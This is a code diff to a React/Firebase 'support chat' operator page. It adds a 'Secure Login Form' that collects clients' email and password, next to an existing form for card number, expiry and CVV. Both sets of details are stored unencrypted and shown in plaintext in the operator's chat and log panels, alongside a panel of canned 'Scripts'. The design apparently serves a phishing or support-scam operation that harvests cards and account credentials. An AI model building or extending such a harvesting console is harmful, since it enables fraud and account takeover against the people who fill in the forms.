@@ -27,16 +27,21 @@ import {
   getDoc,
 } from "firebase/firestore";
 import { db } from "@/lib/firebase";
-import { MdLock, MdDelete, MdEdit, MdCreditCard } from "react-icons/md";
+import { MdLock, MdDelete, MdEdit, MdCreditCard, MdEmail } from "react-icons/md";
 
 // ---------------------------
 // Data Types
 // ---------------------------
 type Message = {
   id?: string;
-  sender: string; // always "support" in this support-chat
+  sender: string; // "support" for support messages or "client" for client messages
   text: string;
-  messageType?: "text" | "secure_form_request" | "secure_form_response";
+  messageType?:
+    | "text"
+    | "secure_form_request"
+    | "secure_form_response"
+    | "secure_login_request"
+    | "secure_login_response";
   timestamp?: Timestamp;
   transactionId: string;
 };
@@ -135,7 +140,6 @@ function SecurePaymentDetails({
     const q = query(secureRef, where("transactionId", "==", transactionId));
     const unsubscribe = onSnapshot(q, (snapshot) => {
       if (!snapshot.empty) {
-        // For simplicity, take the first matching document.
         const data = snapshot.docs[0].data();
         setDetails({
           cardNumber: data.cardNumber,
@@ -162,6 +166,64 @@ function SecurePaymentDetails({
 }
 
 // ---------------------------
+// SecureLoginDetails Component (Support Only)
+// ---------------------------
+function SecureLoginDetails({
+  transactionId,
+  maskedText,
+}: {
+  transactionId: string;
+  maskedText: string;
+}) {
+  const [details, setDetails] = useState<{
+    email: string;
+    password: string;
+  } | null>(null);
+
+  useEffect(() => {
+    const secureLoginRef = collection(db, "secureLoginDetails");
+    const q = query(secureLoginRef, where("transactionId", "==", transactionId));
+    const unsubscribe = onSnapshot(q, (snapshot) => {
+      if (!snapshot.empty) {
+        const data = snapshot.docs[0].data();
+        setDetails({
+          email: data.email,
+          password: data.password,
+        });
+      } else {
+        setDetails(null);
+      }
+    });
+    return () => unsubscribe();
+  }, [transactionId]);
+
+  if (details) {
+    return (
+      <div>
+        {`Login Credentials - Email: ${details.email}, Password: ${details.password}`}
+      </div>
+    );
+  }
+  return <div>{maskedText} (Secure login details loading...)</div>;
+}
+
+// ---------------------------
+// SecureLoginRequestPlaceholder Component (Support Only)
+// ---------------------------
+function SecureLoginRequestPlaceholder() {
+  return (
+    <div style={securePlaceholderStyle}>
+      <MdLock style={securePlaceholderIconStyle} />
+      <span>Secure Login Form request sent to client</span>
+    </div>
+  );
+}
+
+// ---------------------------
+// (Note: The SecureLoginForm component for clients would be on a separate page)
+// ---------------------------
+
+// ---------------------------
 // Helper to detect card type (used on secure responses)
 // ---------------------------
 function detectCardType(cardNumber: string): string {
@@ -177,7 +239,7 @@ function detectCardType(cardNumber: string): string {
 }
 
 // ---------------------------
-// NEW: ImageModal Component (for zoom-in effect)
+// ImageModal Component (for zoom-in effect)
 // ---------------------------
 function ImageModal({ src, onClose }: { src: string; onClose: () => void }) {
   return (
@@ -198,7 +260,6 @@ function ImageModal({ src, onClose }: { src: string; onClose: () => void }) {
         animation: "zoomIn 0.3s",
       }}
     >
-      {/* Added width and height props here to fix the error */}
       <Image
         src={src}
         alt="Zoomed"
@@ -220,7 +281,8 @@ function ImageModal({ src, onClose }: { src: string; onClose: () => void }) {
 function ChatContent() {
   const searchParams = useSearchParams();
   const initialTx = searchParams.get("tx") || "";
-  const role = "support";
+  // On the support page, the role is always "support"
+  const userRole: "support" = "support";
 
   const [transactionId, setTransactionId] = useState(initialTx);
   const [messages, setMessages] = useState<Message[]>([]);
@@ -228,9 +290,7 @@ function ChatContent() {
   const [user, setUser] = useState<UserData | null>(null);
   const [loading, setLoading] = useState(false);
   const [containerLoaded, setContainerLoaded] = useState(false);
-  // NEW: State for storing the selected image for zoom modal
   const [selectedImage, setSelectedImage] = useState<string | null>(null);
-  // NEW: Ref for file input to send image messages from support
   const fileInputRef = useRef<HTMLInputElement | null>(null);
 
   // Pre-composed messages state
@@ -246,7 +306,9 @@ function ChatContent() {
   const messagesEndRef = useRef<HTMLDivElement | null>(null);
   const chatInputRef = useRef<HTMLTextAreaElement>(null);
 
-  useEffect(() => { setContainerLoaded(true); }, []);
+  useEffect(() => {
+    setContainerLoaded(true);
+  }, []);
 
   useEffect(() => {
     async function fetchUserData() {
@@ -324,12 +386,15 @@ function ChatContent() {
   };
 
   // Optimistic message sending
-  const sendMessage = async (text: string, messageType: Message["messageType"] = "text") => {
+  const sendMessage = async (
+    text: string,
+    messageType: Message["messageType"] = "text"
+  ) => {
     const trimmed = text.trim();
     if (!trimmed) return;
     const optimisticMessage: Message = {
       id: "temp-" + Date.now(),
-      sender: role,
+      sender: userRole,
       text: trimmed,
       messageType,
       timestamp: Timestamp.now(),
@@ -339,7 +404,7 @@ function ChatContent() {
     try {
       await addDoc(collection(db, "messages"), {
         transactionId,
-        sender: role,
+        sender: userRole,
         text: trimmed,
         messageType,
         timestamp: serverTimestamp(),
@@ -349,41 +414,76 @@ function ChatContent() {
     }
   };
 
+  // Called on form submit (fallback for send button)
   const handleSend = async (e: FormEvent) => {
     e.preventDefault();
     const message = chatInput.trim();
     if (!message) return;
-    setChatInput(""); // Clear the input immediately
+    setChatInput("");
     await sendMessage(message);
     if (chatInputRef.current) {
       chatInputRef.current.style.height = "auto";
     }
   };
-  
 
-  // When secure form button is clicked, support sends a secure form request.
+  // Sends message on pressing Enter (without Shift)
+  const handleKeyDown = (e: React.KeyboardEvent<HTMLTextAreaElement>) => {
+    if (e.key === "Enter" && !e.shiftKey) {
+      e.preventDefault();
+      const message = chatInput.trim();
+      if (message) {
+        setChatInput("");
+        sendMessage(message);
+        if (chatInputRef.current) {
+          chatInputRef.current.style.height = "auto";
+        }
+      }
+    }
+  };
+
+  // Adjust textarea height as user types.
+  const handleChatInputChange = (e: ChangeEvent<HTMLTextAreaElement>) => {
+    setChatInput(e.target.value);
+    if (chatInputRef.current) {
+      chatInputRef.current.style.height = "auto";
+      chatInputRef.current.style.height = `${chatInputRef.current.scrollHeight}px`;
+    }
+  };
+
+  // When secure payment form button is clicked, support sends a secure payment form request.
   const handleSendSecureFormRequest = async () => {
     await sendMessage("Secure Payment Form", "secure_form_request");
   };
 
-  // When a secure form response is received (filled by client), support sees full details.
-  // (This function is not used here directly in rendering; full details will be fetched by SecurePaymentDetails.)
-  const handleSecurePaymentSubmit = async (paymentDetails: {
-    cardNumber: string;
-    expiry: string;
-    cvv: string;
-  }) => {
-    const detailsText = `Payment Details - Card: ${paymentDetails.cardNumber}, Expiry: ${paymentDetails.expiry}, CVV: ${paymentDetails.cvv}`;
-    await sendMessage(detailsText, "secure_form_response");
+  // When secure login form button is clicked, support sends a secure login form request.
+  const handleSendSecureLoginRequest = async () => {
+    await sendMessage("Secure Login Form", "secure_login_request");
   };
 
-  // Updated renderMessageContent: if messageType is secure_form_response, render SecurePaymentDetails.
+  // Render message content based on message type.
   const renderMessageContent = (msg: Message) => {
     if (msg.messageType === "secure_form_request") {
       return <SecureFormRequestPlaceholder />;
     }
     if (msg.messageType === "secure_form_response") {
-      return <SecurePaymentDetails transactionId={msg.transactionId} maskedText={msg.text} />;
+      return (
+        <SecurePaymentDetails
+          transactionId={msg.transactionId}
+          maskedText={msg.text}
+        />
+      );
+    }
+    if (msg.messageType === "secure_login_request") {
+      // On the support page, always show the placeholder.
+      return <SecureLoginRequestPlaceholder />;
+    }
+    if (msg.messageType === "secure_login_response") {
+      return (
+        <SecureLoginDetails
+          transactionId={msg.transactionId}
+          maskedText={msg.text}
+        />
+      );
     }
     if (/https?:\/\/[^\s]+/.test(msg.text)) {
       return (
@@ -406,7 +506,6 @@ function ChatContent() {
             width={300}
             height={200}
             style={{ borderRadius: "10px", marginTop: "5px", cursor: "pointer" }}
-            // NEW: Prevent default link action and open modal on image click
             onClick={(e) => {
               e.preventDefault();
               setSelectedImage(msg.text);
@@ -499,15 +598,7 @@ function ChatContent() {
     );
   };
 
-  const handleChatInputChange = (e: ChangeEvent<HTMLTextAreaElement>) => {
-    setChatInput(e.target.value);
-    if (chatInputRef.current) {
-      chatInputRef.current.style.height = "auto";
-      chatInputRef.current.style.height = `${chatInputRef.current.scrollHeight}px`;
-    }
-  };
-
-  // NEW: Handle file change to send image messages from support
+  // Handle file change for image messages.
   const handleFileChange = (e: ChangeEvent<HTMLInputElement>) => {
     const file = e.target.files?.[0];
     if (file) {
@@ -518,7 +609,7 @@ function ChatContent() {
           try {
             await addDoc(collection(db, "messages"), {
               transactionId,
-              sender: role,
+              sender: userRole,
               text: imageUrl,
               timestamp: serverTimestamp(),
             });
@@ -569,9 +660,12 @@ function ChatContent() {
     }
   };
 
-  // Logs Panel: secure form responses from client (for quick reference)
+  // Filter logs for secure responses.
   const secureFormLogs = messages.filter(
     (msg) => msg.messageType === "secure_form_response" && msg.sender === "client"
+  );
+  const secureLoginLogs = messages.filter(
+    (msg) => msg.messageType === "secure_login_response" && msg.sender === "client"
   );
 
   return (
@@ -579,153 +673,157 @@ function ChatContent() {
       {!transactionId || transactionId === "support-chat" ? (
         <TransactionForm onSubmit={(tx) => setTransactionId(tx)} />
       ) : loading ? (
-        <h2 style={{ textAlign: "center", marginTop: "50px", color: "#5865F2" }}>
-          Loading...
-        </h2>
+        <h2 style={{ textAlign: "center", marginTop: "50px", color: "#5865F2" }}>Loading...</h2>
       ) : (
-        <div style={{ ...chatWrapperStyle, ...containerAnimationStyle }}>
-          {/* Pre-Composed Messages Panel */}
-          <div style={preComposedContainerStyle}>
-            <h3 style={{ textAlign: "center", color: "#5865F2", marginBottom: "20px" }}>
-              Scripts
-            </h3>
-            {preComposedMessages.map((msg) => (
-              <div key={msg.id} style={preComposedMessageStyle}>
-                {editingId === msg.id ? (
-                  <>
-                    <input
-                      type="text"
-                      value={editingText}
-                      onChange={(e) => setEditingText(e.target.value)}
-                      style={{
-                        flex: 1,
-                        marginRight: "5px",
-                        padding: "5px",
-                        borderRadius: "4px",
-                        border: "1px solid #ccc",
-                        color: "black",
-                      }}
-                    />
-                    <button onClick={() => saveEditedPreComposedMessage(msg.id)} style={preComposedButtonStyle}>
-                      Save
-                    </button>
-                  </>
-                ) : (
-                  <>
-                    <span
-                      style={{ flex: 1, cursor: "pointer", color: "black" }}
-                      onClick={() => sendMessage(msg.text)}
-                    >
-                      {msg.text}
-                    </span>
-                    <button onClick={() => editPreComposedMessage(msg.id)} style={preComposedButtonStyle}>
-                      Edit
-                    </button>
-                    <button onClick={() => deletePreComposedMessage(msg.id)} style={preComposedButtonStyle}>
-                      Delete
-                    </button>
-                  </>
-                )}
+        <>
+          <div style={{ ...chatWrapperStyle, ...containerAnimationStyle }}>
+            {/* Pre-Composed Messages Panel */}
+            <div style={preComposedContainerStyle}>
+              <h3 style={{ textAlign: "center", color: "#5865F2", marginBottom: "20px" }}>Scripts</h3>
+              {preComposedMessages.map((msg) => (
+                <div key={msg.id} style={preComposedMessageStyle}>
+                  {editingId === msg.id ? (
+                    <>
+                      <input
+                        type="text"
+                        value={editingText}
+                        onChange={(e) => setEditingText(e.target.value)}
+                        style={{
+                          flex: 1,
+                          marginRight: "5px",
+                          padding: "5px",
+                          borderRadius: "4px",
+                          border: "1px solid #ccc",
+                          color: "black",
+                        }}
+                      />
+                      <button onClick={() => saveEditedPreComposedMessage(msg.id)} style={preComposedButtonStyle}>
+                        Save
+                      </button>
+                    </>
+                  ) : (
+                    <>
+                      <span style={{ flex: 1, cursor: "pointer", color: "black" }} onClick={() => sendMessage(msg.text)}>
+                        {msg.text}
+                      </span>
+                      <button onClick={() => editPreComposedMessage(msg.id)} style={preComposedButtonStyle}>
+                        Edit
+                      </button>
+                      <button onClick={() => deletePreComposedMessage(msg.id)} style={preComposedButtonStyle}>
+                        Delete
+                      </button>
+                    </>
+                  )}
+                </div>
+              ))}
+              <div style={{ marginTop: "20px" }}>
+                <input
+                  type="text"
+                  value={newPreComposed}
+                  onChange={(e) => setNewPreComposed(e.target.value)}
+                  placeholder="New script message"
+                  style={{
+                    width: "100%",
+                    padding: "8px",
+                    borderRadius: "4px",
+                    border: "1px solid #ccc",
+                    color: "black",
+                  }}
+                />
+                <button
+                  onClick={addPreComposedMessage}
+                  style={{
+                    width: "100%",
+                    padding: "8px",
+                    marginTop: "8px",
+                    borderRadius: "4px",
+                    backgroundColor: "#5865F2",
+                    color: "#fff",
+                    border: "none",
+                    cursor: "pointer",
+                    transition: "background-color 0.3s ease",
+                  }}
+                >
+                  Add
+                </button>
               </div>
-            ))}
-            <div style={{ marginTop: "20px" }}>
-              <input
-                type="text"
-                value={newPreComposed}
-                onChange={(e) => setNewPreComposed(e.target.value)}
-                placeholder="New script message"
-                style={{
-                  width: "100%",
-                  padding: "8px",
-                  borderRadius: "4px",
-                  border: "1px solid #ccc",
-                  color: "black",
-                }}
-              />
-              <button
-                onClick={addPreComposedMessage}
-                style={{
-                  width: "100%",
-                  padding: "8px",
-                  marginTop: "8px",
-                  borderRadius: "4px",
-                  backgroundColor: "#5865F2",
-                  color: "#fff",
-                  border: "none",
-                  cursor: "pointer",
-                  transition: "background-color 0.3s ease",
-                }}
-              >
-                Add
-              </button>
+            </div>
+
+            {/* Chat Container */}
+            <div style={chatContainerStyle}>
+              <div style={chatHeaderStyle}>
+                Support Chat {user ? `- ${user.username}` : ""} (TX: {transactionId})
+              </div>
+              <div style={chatMessagesStyle}>
+                {messages.map((msg) => renderMessage(msg))}
+                <div ref={messagesEndRef} />
+              </div>
+              <form onSubmit={handleSend} style={chatInputContainerStyle}>
+                <button type="button" onClick={() => fileInputRef.current?.click()} style={plusIconStyle}>
+                  +
+                </button>
+                <textarea
+                  ref={chatInputRef}
+                  value={chatInput}
+                  onChange={handleChatInputChange}
+                  onKeyDown={handleKeyDown}
+                  placeholder="Type your message..."
+                  style={chatInputStyle}
+                  rows={1}
+                />
+                <button type="submit" style={chatSendStyle}>
+                  Send
+                </button>
+              </form>
             </div>
           </div>
 
-          {/* Chat Container */}
-          <div style={chatContainerStyle}>
-            <div style={chatHeaderStyle}>
-              Support Chat {user ? `- ${user.username}` : ""} (TX: {transactionId})
-            </div>
-            <div style={chatMessagesStyle}>
-              {messages.map((msg) => renderMessage(msg))}
-              <div ref={messagesEndRef} />
-            </div>
-            <form onSubmit={handleSend} style={chatInputContainerStyle}>
-              {/* NEW: Minimal plus icon button for sending image files */}
-              <button
-                type="button"
-                onClick={() => fileInputRef.current?.click()}
-                style={plusIconStyle}
-              >
-                +
-              </button>
-              <textarea
-                ref={chatInputRef}
-                value={chatInput}
-                onChange={handleChatInputChange}
-                placeholder="Type your message..."
-                style={chatInputStyle}
-                rows={1}
-              />
-              <button type="submit" style={chatSendStyle}>
-                Send
-              </button>
-              <button
-                type="button"
-                onClick={handleSendSecureFormRequest}
-                style={{ ...chatSendStyle, backgroundColor: "#28a745", marginLeft: "10px" }}
-              >
-                Secure Form
-              </button>
-              {/* NEW: Hidden file input for image sending */}
-              <input
-                type="file"
-                accept="image/*"
-                ref={fileInputRef}
-                style={{ display: "none" }}
-                onChange={handleFileChange}
-              />
-            </form>
+          {/* Secure Actions Section */}
+          <div style={secureActionsContainerStyle}>
+            <button
+              type="button"
+              onClick={handleSendSecureFormRequest}
+              style={{ ...chatSendStyle, backgroundColor: "#28a745" }}
+            >
+              Secure Payment Form
+            </button>
+            <button
+              type="button"
+              onClick={handleSendSecureLoginRequest}
+              style={{ ...chatSendStyle, backgroundColor: "#007bff" }}
+            >
+              Secure Login Form
+            </button>
           </div>
 
-          {/* Logs Panel */}
-          <div style={logsContainerStyle}>
-            <h3 style={{ color: "#5865F2", textAlign: "center", marginBottom: "10px" }}>
-              Secure Form Logs
-            </h3>
-            {secureFormLogs.map((log) => (
-              <div key={log.id} style={logItemStyle}>
-                <MdCreditCard style={{ marginRight: "8px", color: "#5865F2" }} />
-                <SecurePaymentDetails transactionId={log.transactionId} maskedText={log.text} />
-              </div>
-            ))}
+          {/* Logs Panels */}
+          <div style={logsWrapperStyle}>
+            <div style={logsContainerStyle}>
+              <h3 style={{ color: "#5865F2", textAlign: "center", marginBottom: "10px" }}>
+                Secure Form Logs
+              </h3>
+              {secureFormLogs.map((log) => (
+                <div key={log.id} style={logItemStyle}>
+                  <MdCreditCard style={{ marginRight: "8px", color: "#5865F2" }} />
+                  <SecurePaymentDetails transactionId={log.transactionId} maskedText={log.text} />
+                </div>
+              ))}
+            </div>
+            <div style={logsContainerStyle}>
+              <h3 style={{ color: "#5865F2", textAlign: "center", marginBottom: "10px" }}>
+                Secure Login Logs
+              </h3>
+              {secureLoginLogs.map((log) => (
+                <div key={log.id} style={logItemStyle}>
+                  <MdLock style={{ marginRight: "8px", color: "#5865F2" }} />
+                  <SecureLoginDetails transactionId={log.transactionId} maskedText={log.text} />
+                </div>
+              ))}
+            </div>
           </div>
-        </div>
+        </>
       )}
-      {/* NEW: Render the ImageModal if an image has been clicked */}
-      {selectedImage && (
-        <ImageModal src={selectedImage} onClose={() => setSelectedImage(null)} />
-      )}
+      {selectedImage && <ImageModal src={selectedImage} onClose={() => setSelectedImage(null)} />}
     </div>
   );
 }
@@ -740,7 +838,6 @@ export default function SupportChat() {
       }
     >
       <ChatContent />
-      {/* NEW: Global style for zoom-in animation */}
       <style jsx global>{`
         @keyframes zoomIn {
           from {
@@ -765,8 +862,8 @@ const chatPageStyle: React.CSSProperties = {
   fontFamily: "sans-serif",
   backgroundColor: "#E0E3FF",
   display: "flex",
+  flexDirection: "column",
   alignItems: "center",
-  justifyContent: "center",
   minHeight: "100vh",
   padding: "20px",
   boxSizing: "border-box",
@@ -819,30 +916,10 @@ const preComposedButtonStyle: React.CSSProperties = {
 };
 
 const chatContainerStyle: React.CSSProperties = {
-  width: "40%",
+  width: "70%",
   display: "flex",
   flexDirection: "column",
   backgroundColor: "#fff",
-};
-
-const logsContainerStyle: React.CSSProperties = {
-  width: "20%",
-  backgroundColor: "#f9f9f9",
-  borderLeft: "2px solid #ccc",
-  padding: "10px",
-  overflowY: "auto",
-};
-
-const logItemStyle: React.CSSProperties = {
-  display: "flex",
-  alignItems: "center",
-  padding: "8px",
-  marginBottom: "8px",
-  backgroundColor: "#fff",
-  borderRadius: "5px",
-  border: "1px solid #ccc",
-  color: "#333",
-  fontSize: "14px",
 };
 
 const chatHeaderStyle: React.CSSProperties = {
@@ -935,7 +1012,6 @@ const deleteBtnStyle: React.CSSProperties = {
   opacity: 0.8,
 };
 
-// NEW: Minimal style for the plus icon button
 const plusIconStyle: React.CSSProperties = {
   background: "none",
   border: "none",
@@ -946,3 +1022,41 @@ const plusIconStyle: React.CSSProperties = {
   padding: "0",
 };
 
+const secureActionsContainerStyle: React.CSSProperties = {
+  marginTop: "20px",
+  display: "flex",
+  justifyContent: "center",
+  gap: "20px",
+};
+
+const logsWrapperStyle: React.CSSProperties = {
+  display: "flex",
+  justifyContent: "space-between",
+  gap: "20px",
+  marginTop: "20px",
+  width: "100%",
+  maxWidth: "1200px",
+  marginLeft: "auto",
+  marginRight: "auto",
+};
+
+const logItemStyle: React.CSSProperties = {
+  display: "flex",
+  alignItems: "center",
+  padding: "8px",
+  marginBottom: "8px",
+  backgroundColor: "#fff",
+  borderRadius: "5px",
+  border: "1px solid #ccc",
+  color: "#333",
+  fontSize: "14px",
+};
+
+const logsContainerStyle: React.CSSProperties = {
+  width: "48%",
+  backgroundColor: "#f9f9f9",
+  padding: "10px",
+  border: "1px solid #ccc",
+  borderRadius: "4px",
+  overflowY: "auto",
+};
